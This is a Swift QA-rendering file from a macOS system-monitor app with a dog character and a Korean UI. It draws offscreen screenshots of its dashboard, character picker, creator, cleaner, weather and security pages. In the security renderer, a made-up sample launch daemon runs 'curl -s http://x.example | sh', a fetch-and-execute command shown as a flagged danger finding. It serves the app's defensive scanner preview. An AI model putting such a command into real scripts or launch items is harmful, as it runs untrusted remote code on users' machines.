import AppKit
import SwiftUI

/// QA renders of the popover. AppKit-backed controls need a real NSHostingView in a window,
/// so this draws an offscreen window instead of using ImageRenderer.
enum DashboardSnapshot {
    /// QA_PHOTO overrides the bundled photo (a bare `swift run` binary has no bundle resources).
    static var qaPhoto: String? { ProcessInfo.processInfo.environment["QA_PHOTO"] ?? AppSettings.bundledPhotoPath }

    static func render(to dir: URL) throws {
        _ = NSApplication.shared
        // Settings live in AppDefaults.store, a throwaway suite for this run (main.swift), so nothing needs restoring.
        let settings = AppSettings.shared
        settings.photoPath = qaPhoto

        let monitor = SystemMonitor()
        monitor.sampleNow()
        Thread.sleep(forTimeInterval: 1)
        monitor.sampleNow()
        // A few real ticks so the sparklines have something to draw.
        monitor.start()
        RunLoop.main.run(until: Date(timeIntervalSinceNow: 4.5))
        monitor.stop()
        monitor.sampleNow()

        if ProcessInfo.processInfo.environment["QA_ONLY"] == "agent" { return try MainActor.assumeIsolated { try AgentQA.render(to: dir) } }
        if ProcessInfo.processInfo.environment["QA_ONLY"] == "extras" { return try renderExtras(monitor: monitor, settings: settings, to: dir) }
        if ProcessInfo.processInfo.environment["QA_ONLY"] == "desktop" { return try MainActor.assumeIsolated { try DesktopQA.render(to: dir) } }
        #if !MAS
        if ProcessInfo.processInfo.environment["QA_ONLY"] == "social" { return try MainActor.assumeIsolated { try DesktopQA.social(to: dir) } }
        if ProcessInfo.processInfo.environment["QA_ONLY"] == "sponsor" { return try MainActor.assumeIsolated { try DesktopQA.sponsor(to: dir) } }
        #endif
        if ProcessInfo.processInfo.environment["QA_ONLY"] == "breath" { return try MainActor.assumeIsolated { try BreathView.render(to: dir) } }
        if ProcessInfo.processInfo.environment["QA_ONLY"] == "weather" { return try renderWeather(settings: settings, to: dir) }
        if ProcessInfo.processInfo.environment["QA_ONLY"] == "pages" { return try renderPages(monitor: monitor, settings: settings, to: dir) }
        try renderPicker(monitor: monitor, settings: settings, to: dir)
        if ProcessInfo.processInfo.environment["QA_ONLY"] == "picker" { return }

        let pages: [(DashboardPage, String)] = [(.settings, "settings"), (.dog, "dog"), (.customize, "customize")]   // dashboard: renderPages
        settings.character = .dog
        for (appearance, suffix) in [(NSAppearance.Name.aqua, "light"), (.darkAqua, "dark")] {
            for (page, prefix) in pages {
                let view = DashboardView(monitor: monitor, settings: settings, onQuit: {}, startPage: page)
                try snapshot(view, appearance: appearance, to: dir.appendingPathComponent("\(prefix)-\(suffix).png"))
            }
        }
        #if MAS
        try renderCustom(monitor: monitor, settings: settings, to: dir)
        #else
        try MainActor.assumeIsolated { try renderUpdate(monitor: monitor, settings: settings, to: dir) }
        try renderCustom(monitor: monitor, settings: settings, to: dir)
        try renderCleaner(monitor: monitor, to: dir)
        try MainActor.assumeIsolated { try renderSecurity(monitor: monitor, settings: settings, to: dir) }
        #endif
        try renderPages(monitor: monitor, settings: settings, to: dir)
    }

    /// The dashboard, 펫 키우기 and AI 비서 (QA_ONLY=pages renders just these, tools/appstore/shots.py), then their states.
    private static func renderPages(monitor: SystemMonitor, settings: AppSettings, to dir: URL) throws {
        settings.character = .dog
        for (appearance, suffix) in [(NSAppearance.Name.aqua, "light"), (.darkAqua, "dark")] {
            for (page, prefix) in [(DashboardPage.main, "dashboard"), (.pet, "pet"), (.assistant, "assistant")] {
                try snapshot(DashboardView(monitor: monitor, settings: settings, onQuit: {}, startPage: page),
                             appearance: appearance, to: dir.appendingPathComponent("\(prefix)-\(suffix).png"))
            }
        }
        try renderPet(monitor: monitor, settings: settings, to: dir)
        try renderAssistant(monitor: monitor, settings: settings, to: dir)   // UI/AssistantQA.swift
    }

    #if !MAS
    /// security: the real read-only scan as the popover shows it (security-full: the whole page).
    /// security-sample: the same with made-up findings of every kind, and dashboard-security-alert: the header line.
    @MainActor private static func renderSecurity(monitor: SystemMonitor, settings: AppSettings, to dir: URL) throws {
        let center = SecurityCenter.shared
        let real = SecurityScanner.scan()
        defer { center.report = nil }
        var sample = real
        let home = NSHomeDirectory()
        sample.protections = sample.protections.map { p in
            var p = p
            if p.id == "autologin" { p.level = .danger; p.line = "jelly 계정이 암호 없이 로그인돼요. 누구나 맥을 켜면 들어와요 (미리보기 예시)"; p.button = "설정 열기" }
            return p
        }
        sample.launchItems = [
            LaunchItem(label: "com.sample.update (미리보기 예시)", plist: "/Library/LaunchDaemons/com.sample.update.plist", place: .daemon,
                       argv: ["/bin/bash", "-c", "curl -s http://x.example | sh"], target: "/bin/bash", interpreter: true,
                       signature: CodeSignature(state: .signed, apple: true), level: .danger, reason: "인터넷에서 받은 스크립트를 바로 실행해요"),
            LaunchItem(label: "com.sample.helper (미리보기 예시)", plist: home + "/Library/LaunchAgents/com.sample.helper.plist", place: .userAgent,
                       argv: [home + "/Library/Application Support/a8Xk29fQ0z3/helper"], target: home + "/Library/Application Support/a8Xk29fQ0z3/helper",
                       interpreter: false, signature: CodeSignature(state: .unsigned), level: .danger,
                       reason: "Application Support 안 무작위 이름 폴더에서 실행돼요 · 서명 없는 프로그램"),
            LaunchItem(label: "com.sample.old (미리보기 예시)", plist: home + "/Library/LaunchAgents/젤리 모니터가 끈 항목/com.sample.old.plist",
                       place: .userAgent, argv: ["/Applications/Old.app/Contents/MacOS/Old"], target: "/Applications/Old.app/Contents/MacOS/Old",
                       interpreter: false, parked: true, signature: CodeSignature(state: .missing), level: .warn,
                       reason: "실행 파일이 없어요. 지운 앱이 남긴 항목일 수 있어요"),
        ] + real.launchItems
        sample.apps = [AppFinding(name: "Sample Tool (미리보기 예시)", path: "/Applications/Sample Tool.app", bundleID: "com.sample.tool",
                                  signature: CodeSignature(state: .unsigned), level: .warn, reason: "서명이 없는 앱이에요. 받은 곳을 모르면 지워 주세요")]
            + real.apps
        sample.detections = ["09-28 14:02 XProtectRemediatorAdload: Adload 악성코드를 찾아 지웠어요 (미리보기 예시)"]
        for (appearance, suffix) in [(NSAppearance.Name.aqua, "light"), (.darkAqua, "dark")] {
            center.report = real
            try snapshot(DashboardView(monitor: monitor, settings: settings, onQuit: {}, startPage: .security),
                         appearance: appearance, to: dir.appendingPathComponent("security-\(suffix).png"))
            QARender.fullHeight = true
            try snapshot(DashboardView(monitor: monitor, settings: settings, onQuit: {}, startPage: .security),
                         appearance: appearance, to: dir.appendingPathComponent("security-full-\(suffix).png"))
            center.report = sample
            try snapshot(DashboardView(monitor: monitor, settings: settings, onQuit: {}, startPage: .security),
                         appearance: appearance, to: dir.appendingPathComponent("security-sample-\(suffix).png"))
            QARender.fullHeight = false
            try snapshot(DashboardView(monitor: monitor, settings: settings, onQuit: {}, startPage: .main),
                         appearance: appearance, to: dir.appendingPathComponent("dashboard-security-alert-\(suffix).png"))
        }
    }
    #endif

    /// 캐릭터 선택 states: picker-dog / picker-cat (동물 tab), picker-characters and -selected, and the preview page of an
    /// original. An empty catalog gets a stand-in made from a preset dog's frames.
    private static func renderPicker(monitor: SystemMonitor, settings: AppSettings, to dir: URL) throws {
        struct Sample: AnimatedCharacter {
            let id = "qa-sample"
            let displayName = "미리보기 예시"
            let cache = DogSpriteCache(profile: DogProfile.presets.first { $0.id == "shiba" }?.profile ?? .defaultDog, style: .auto)
            var imageSize: NSSize { cache.imageSize }
            func frames(for pose: DogPose) -> [NSImage] { cache.frames(for: pose) }
            func frames(forExtra motion: ExtraMotion) -> [NSImage]? { motion == .special ? cache.frames(for: .sprint) : nil }
        }
        let originals = OriginalCatalog.all
        defer { OriginalCatalog.all = originals; settings.character = .dog }
        settings.character = .dog
        let previewID = originals.first?.id ?? "qa-sample"
        func picker(_ tab: PickerTab, _ species: PickerSpecies = .dog) -> some View {
            DogPickerView(settings: settings, sprites: SpriteHolder(), tab: tab, species: species, onCreate: {}, onEdit: { _ in }, onBack: {})
                .frame(width: 400)
        }
        for (appearance, suffix) in [(NSAppearance.Name.aqua, "light"), (.darkAqua, "dark")] {
            try snapshot(picker(.animals), appearance: appearance, to: dir.appendingPathComponent("picker-dog-\(suffix).png"))
            try snapshot(picker(.animals, .cat), appearance: appearance, to: dir.appendingPathComponent("picker-cat-\(suffix).png"))
            try snapshot(picker(.characters), appearance: appearance, to: dir.appendingPathComponent("picker-characters-\(suffix).png"))
            if originals.isEmpty { OriginalCatalog.all = [Sample()] }
            try snapshot(picker(.characters), appearance: appearance, to: dir.appendingPathComponent("picker-characters-sample-\(suffix).png"))
            QARender.fullHeight = true
            try snapshot(DashboardView(monitor: monitor, settings: settings, onQuit: {}, startPage: .preview(previewID)),
                         appearance: appearance, to: dir.appendingPathComponent("preview-\(suffix).png"))
            QARender.fullHeight = false
            settings.useOriginal(previewID)
            try snapshot(picker(.characters), appearance: appearance, to: dir.appendingPathComponent("picker-characters-selected-\(suffix).png"))
            try snapshot(DashboardView(monitor: monitor, settings: settings, onQuit: {}, startPage: .main),
                         appearance: appearance, to: dir.appendingPathComponent("dashboard-original-\(suffix).png"))
            // 꾸미기 of an original (part colours, 목록에서 지우기), then the tan cat recoloured, then a cat breed.
            try snapshot(DashboardView(monitor: monitor, settings: settings, onQuit: {}, startPage: .customize),
                         appearance: appearance, to: dir.appendingPathComponent("customize-original-\(suffix).png"))
            if OriginalCatalog.character("original-tan-cat") != nil {
                settings.useOriginal("original-tan-cat")
                settings.characterColors["original-tan-cat"] = ["fur": RGBColor(hex: "#F2F2F2"), "cap": RGBColor(hex: "#E2384D"),
                                                                "hoodie": RGBColor(hex: "#3A7BE0")]
                try snapshot(DashboardView(monitor: monitor, settings: settings, onQuit: {}, startPage: .customize),
                             appearance: appearance, to: dir.appendingPathComponent("customize-original-recolor-\(suffix).png"))
                settings.characterColors = [:]
            }
            if let cat = CatCatalog.all.first {
                settings.useCat(cat.id)
                try snapshot(DashboardView(monitor: monitor, settings: settings, onQuit: {}, startPage: .customize),
                             appearance: appearance, to: dir.appendingPathComponent("customize-cat-\(suffix).png"))
            }
            settings.character = .dog
            OriginalCatalog.all = originals
        }
    }

    #if !MAS
    /// settings-update-available: the update card with a (made-up, unsigned, never installed) newer version.
    @MainActor private static func renderUpdate(monitor: SystemMonitor, settings: AppSettings, to dir: URL) throws {
        let updater = Updater.shared
        updater.autoUpdate = false   // the switch as a user who turned it off sees it; this suite is thrown away
        updater.qaShow(UpdateManifest(version: "1.9", build: 99, url: UpdateCheck.site.absoluteString, sha256: String(repeating: "0", count: 64),
                                      minSystem: "13.0", notes: "사진 캐릭터를 AI가 도트 그림으로 다듬어 줘요 (미리보기 예시)"))
        defer { updater.qaShow(nil) }
        for (appearance, suffix) in [(NSAppearance.Name.aqua, "light"), (.darkAqua, "dark")] {
            for (page, prefix) in [(DashboardPage.settings, "settings-update-available"), (.main, "dashboard-update-available")] {
                try snapshot(DashboardView(monitor: monitor, settings: settings, onQuit: {}, startPage: page),
                             appearance: appearance, to: dir.appendingPathComponent("\(prefix)-\(suffix).png"))
            }
        }
    }
    #endif

    /// The creator filled with QA_CHARACTER (default my-dog/jelly-avatar.jpg) as its 평소 picture, then that character saved
    /// and selected: picker, 꾸미기 and dashboard. Everything is saved to a scratch folder that is removed after.
    private static func renderCustom(monitor: SystemMonitor, settings: AppSettings, to dir: URL) throws {
        let real = CustomCharacterStore.shared
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("dogmonitor-qa-\(UUID().uuidString)", isDirectory: true)
        CustomCharacterStore.shared = CustomCharacterStore(root: root)
        defer {
            CustomCharacterStore.shared = real
            CreatorModel.qaInputs = [:]
            CreatorModel.qaAI = nil
            try? FileManager.default.removeItem(at: root)
        }
        let path = ProcessInfo.processInfo.environment["QA_CHARACTER"] ?? "my-dog/jelly-avatar.jpg"
        guard let cut = CustomSprite.load(url: URL(fileURLWithPath: path)).flatMap({ CustomSprite.cutout($0) }) else {
            throw CocoaError(.fileReadNoSuchFile, userInfo: [NSFilePathErrorKey: path])
        }
        CreatorModel.qaInputs = [.normal: cut]
        settings.character = .dog
        for (appearance, suffix) in [(NSAppearance.Name.aqua, "light"), (.darkAqua, "dark")] {
            QARender.fullHeight = true
            defer { QARender.fullHeight = false }
            let view = DashboardView(monitor: monitor, settings: settings, onQuit: {}, startPage: .creator)
            try snapshot(view, appearance: appearance, to: dir.appendingPathComponent("creator-\(suffix).png"))
        }
        // creator-auto-*: 자동 다듬기 without calling any AI. The finished state fills 쉴 때 and 바쁠 때 with the photo
        // itself as a stand-in for the AI's poses.
        let states: [(String, CreatorModel.QAState)] = [
            ("drawing", .init(drawing: true, cuts: [:])),
            ("done", .init(drawing: false, cuts: [.rest: cut, .busy: cut])),
            ("failed", .init(drawing: false, cuts: [:], failure: "ChatGPT 사용 한도에 도달했어요.")),
        ]
        for (name, state) in states {
            CreatorModel.qaAI = state
            for (appearance, suffix) in [(NSAppearance.Name.aqua, "light"), (.darkAqua, "dark")] {
                QARender.fullHeight = true
                defer { QARender.fullHeight = false }
                try snapshot(DashboardView(monitor: monitor, settings: settings, onQuit: {}, startPage: .creator),
                             appearance: appearance, to: dir.appendingPathComponent("creator-auto-\(name)-\(suffix).png"))
            }
        }
        CreatorModel.qaAI = nil
        let saved = try CustomCharacterStore.shared.save(name: "사진 젤리", lightRim: false, inputs: [.normal: cut])
        settings.useCustom(saved.id)
        for (appearance, suffix) in [(NSAppearance.Name.aqua, "light"), (.darkAqua, "dark")] {
            for (page, prefix) in [(DashboardPage.dog, "dog-custom"), (.customize, "customize-custom"), (.main, "dashboard-custom")] {
                let view = DashboardView(monitor: monitor, settings: settings, onQuit: {}, startPage: page)
                try snapshot(view, appearance: appearance, to: dir.appendingPathComponent("\(prefix)-\(suffix).png"))
            }
        }
        settings.character = .dog
    }

    #if !MAS
    /// Cleaner page from a real dry-run scan (nothing is quit or deleted), plus its result card with sample numbers.
    private static func renderCleaner(monitor: SystemMonitor, to dir: URL) throws {
        try MainActor.assumeIsolated {
            var scan = Cleaner.scanNow()
            // The app needs minutes of samples; the render shows one sample runaway row (nothing is signalled).
            if scan.runaways.isEmpty {
                scan.runaways = [RunawayCandidate(pid: 99_999, start: 0, name: "node", path: NSHomeDirectory() + "/.npm/_npx/1a2b/node_modules/.bin/vite",
                                                  cpu: 0.97, duration: 720, orphan: true)]
            }
            let sample = CleanerResult(quit: ["미리보기", "QuickTime Player"], asked: ["Keynote"], freed: 1_240_000_000,
                                       trashEmptied: false, memoryBefore: 18 << 30, memoryAfter: 16 << 30)
            for (appearance, suffix) in [(NSAppearance.Name.aqua, "light"), (.darkAqua, "dark")] {
                // cleaner-files keeps three apps so the file list shows without scrolling.
                let short = CleanerScan(apps: Array(scan.apps.prefix(3)), files: scan.files, runaways: scan.runaways, agents: scan.agents)
                // Developer caches and launch agents sit below the fold, so each gets a page of its own.
                let devKinds: Set<CleanTarget.Kind> = [.npmCache, .brewCache, .pipCache, .yarnCache, .simulators, .nodeModules]
                var devFiles = scan.files.filter { devKinds.contains($0.kind) }
                if !devFiles.contains(where: { $0.blocked != nil }), let i = devFiles.firstIndex(where: { $0.kind != .nodeModules }) {
                    devFiles[i].blocked = "\(devFiles[i].kind == .npmCache ? "npm" : "설치 도구") 실행 중이라 이번엔 건너뛰어요 (미리보기 예시)"
                }
                let dev = CleanerScan(apps: [], files: devFiles, runaways: [], agents: [])
                let agents = CleanerScan(apps: [], files: [], runaways: [], agents: scan.agents)
                for (name, phase, s) in [("cleaner", CleanerModel.Phase.ready, scan), ("cleaner-files", .ready, short),
                                         ("cleaner-dev", .ready, dev), ("cleaner-agents", .ready, agents),
                                         ("cleaner-result", .done(sample), scan)] {
                    let model = CleanerModel()
                    model.show(s)
                    model.phase = phase
                    if name == "cleaner" { model.restartSample = (9 * 86_400 + 3600, 3 << 30) }
                    // cleaner-dev opens the node_modules list with one project ticked (drawn only).
                    if name == "cleaner-dev" {
                        model.showModules = true
                        if let first = s.files.first(where: { $0.kind == .nodeModules })?.projects.first { model.pickedModules = [first.modules] }
                    }
                    let view = CleanerView(monitor: monitor, model: model, onBack: {}).frame(width: 400)
                    // cleaner-dev and cleaner-agents show what sits below the fold, so they draw the whole page.
                    QARender.fullHeight = name == "cleaner-dev" || name == "cleaner-agents"
                    defer { QARender.fullHeight = false }
                    try snapshot(view, appearance: appearance, to: dir.appendingPathComponent("\(name)-\(suffix).png"))
                }
            }
        }
    }
    #endif

    /// 날씨 창문 (QA_ONLY=weather): the crystal ball in every scene by day and by night through 날씨 미리보기, offline (the fetch always fails),
    /// and the 데스크톱 친구 settings with its 날씨 창문 panel.
    private static func renderWeather(settings: AppSettings, to dir: URL) throws {
        let service = WeatherService(defaults: AppDefaults.store) { _ in throw URLError(.notConnectedToInternet) }
        for step in [WeatherFrame.defaultStep, WeatherFrame.scales.count - 1] {
            let w = WeatherWindow()
            w.sizeStep = step
            w.cache = DogSpriteCache(SpriteLook(settings), pixelSize: 2 * w.scale)
            for kind in WeatherKind.allCases {
                for night in [false, true] {
                    service.preview = kind
                    service.previewNight = night
                    try snapshot(WeatherSceneView(window: w, service: service), appearance: .aqua,
                                 to: dir.appendingPathComponent("weather-\(Int(w.scale * 100))-\(kind.rawValue)-\(night ? "night" : "day").png"))
                }
            }
        }
        // 한눈에: all fourteen balls at 100%, day over night, on a light and a dark desktop, to judge the glass, the
        // see-through corners and the contact shadow side by side.
        let sheet = WeatherWindow()
        sheet.cache = DogSpriteCache(SpriteLook(settings), pixelSize: 2 * sheet.scale)
        let skies = [false, true].map { night in
            WeatherKind.allCases.map { kind -> WeatherService in
                let one = WeatherService(defaults: AppDefaults.store) { _ in throw URLError(.notConnectedToInternet) }
                one.preview = kind
                one.previewNight = night
                return one
            }
        }
        for (name, top, bottom) in [("light", "#C9D6E6", "#9FB3CC"), ("dark", "#2A3142", "#151922")] {
            let view = VStack(spacing: 12) {
                ForEach(skies.indices, id: \.self) { row in
                    HStack(spacing: 12) { ForEach(skies[row].indices, id: \.self) { WeatherSceneView(window: sheet, service: skies[row][$0]) } }
                }
            }
            .padding(20)
            .background(LinearGradient(colors: [WeatherArt.color(top), WeatherArt.color(bottom)], startPoint: .top, endPoint: .bottom))
            try snapshot(view, appearance: .aqua, to: dir.appendingPathComponent("weather-orb-sheet-\(name).png"))
        }
        // 받침 색: each theme at 200% on a real (made-up) clear day, a temperature apiece so the name plate and the
        // sunglasses (31°) and knit hat (-2°) show too; then 50% for the small tag.
        service.preview = nil
        service.previewNight = false
        let w = WeatherWindow()
        w.sizeStep = WeatherFrame.scales.count - 1
        w.cache = DogSpriteCache(SpriteLook(settings), pixelSize: 2 * w.scale)
        let day = WeatherDay(high: 20, low: 10, wet: false, snowy: false)
        for (theme, temp) in zip(WeatherTheme.allCases, [18, 31, -2, 9, 24]) {
            w.theme = theme
            service.show(WeatherNow(city: "서울", kind: .clear, night: false, temperature: temp, wind: 1, today: day))
            try snapshot(WeatherSceneView(window: w, service: service), appearance: .aqua, to: dir.appendingPathComponent("weather-theme-\(theme.rawValue).png"))
        }
        w.sizeStep = 0
        w.cache = DogSpriteCache(SpriteLook(settings), pixelSize: 2 * w.scale)
        try snapshot(WeatherSceneView(window: w, service: service), appearance: .aqua, to: dir.appendingPathComponent("weather-theme-50.png"))
        try snapshot(DesktopSettingsView().frame(width: 380).padding(), appearance: .aqua, to: dir.appendingPathComponent("weather-settings-light.png"))
        try snapshot(DesktopSettingsView().frame(width: 380).padding(), appearance: .darkAqua, to: dir.appendingPathComponent("weather-settings-dark.png"))
    }

    static func snapshot<V: View>(_ view: V, appearance: NSAppearance.Name, to url: URL) throws {
        let host = NSHostingView(rootView: view)
        let window = NSWindow(contentRect: NSRect(x: -4000, y: -4000, width: 400, height: 700),
                              styleMask: .borderless, backing: .buffered, defer: false)
        window.appearance = NSAppearance(named: appearance)
        window.backgroundColor = .windowBackgroundColor
        window.contentView = host
        window.orderFrontRegardless()

        // Two passes: CappedScroll measures its content, then the window fits the result.
        for _ in 0..<3 {
            host.layoutSubtreeIfNeeded()
            RunLoop.main.run(until: Date(timeIntervalSinceNow: 0.25))
            window.setContentSize(host.fittingSize)
        }
        host.layoutSubtreeIfNeeded()
        RunLoop.main.run(until: Date(timeIntervalSinceNow: 0.25))

        let bounds = host.bounds
        guard let rep = NSBitmapImageRep(bitmapDataPlanes: nil, pixelsWide: Int(bounds.width * 2), pixelsHigh: Int(bounds.height * 2),
                                         bitsPerSample: 8, samplesPerPixel: 4, hasAlpha: true, isPlanar: false,
                                         colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0) else {
            throw CocoaError(.fileWriteUnknown)
        }
        rep.size = bounds.size
        // The window background is not part of the view, so paint it first.
        NSGraphicsContext.saveGraphicsState()
        NSGraphicsContext.current = NSGraphicsContext(bitmapImageRep: rep)
        window.effectiveAppearance.performAsCurrentDrawingAppearance {
            NSColor.windowBackgroundColor.setFill()
            bounds.fill()
        }
        NSGraphicsContext.restoreGraphicsState()
        host.cacheDisplay(in: bounds, to: rep)
        window.orderOut(nil)

        guard let png = rep.representation(using: .png, properties: [:]) else { throw CocoaError(.fileWriteUnknown) }
        try png.write(to: url)
    }
}
